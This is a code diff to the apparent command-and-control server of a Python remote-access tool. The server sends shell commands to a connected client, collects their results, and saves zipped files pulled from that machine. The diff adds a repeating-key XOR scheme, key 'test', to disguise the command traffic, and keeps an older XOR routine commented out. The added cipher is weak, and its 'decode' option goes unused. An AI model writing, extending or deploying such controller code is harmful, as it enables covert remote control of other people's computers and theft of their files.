@@ -1,4 +1,6 @@
 import socket
+from itertools import cycle
+import base64
 
 DSIZE = 102400 # Data Size
 DELIMETER = "<END_OF_RESULTS>"
@@ -23,11 +25,14 @@ class ServerConnection :
         return (self.client_conn , self.client_add)
     
     def send_data(self , cmd):
-        self.client_conn.send(cmd.encode('utf-8'))
+        # self.client_conn.send(cmd.encode('utf-8'))
+        encry = self.encryptDecrypt(cmd,encode=True)
+        self.client_conn.send(encry)
         
     def recv_data(self):
         data = self.client_conn.recv(DSIZE)
         self.data = data.decode('utf-8')
+        self.data = self.encryptDecrypt(self.data)
         return self.data
     
     def receive_result(self):
@@ -78,6 +83,27 @@ class ServerConnection :
          with open(zipped_file,'wb') as file:
                  file.write(full_file)
          print ("[+] Received Successfully")
+
+    # def encryptDecrypt(self,inpString):
+    #      xorKey = 'J'
+      
+    #      length = len(inpString) 
+      
+    #      for i in range(length): 
+            
+    #         inpString = (inpString[:i] + 
+    #               chr(ord(inpString[i]) ^ ord(xorKey)) +
+    #                        inpString[i + 1:]) 
+    #         print(inpString[i], end = "") 
+            
+    #      return inpString
+    def encryptDecrypt(self,data, key = 'test', encode = False, decode = False):
+        
+        xored = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(data, cycle(key)))
+         
+        if encode:
+           return xored.encode('utf-8')
+        return xored
 
     
     def end_conn(self):
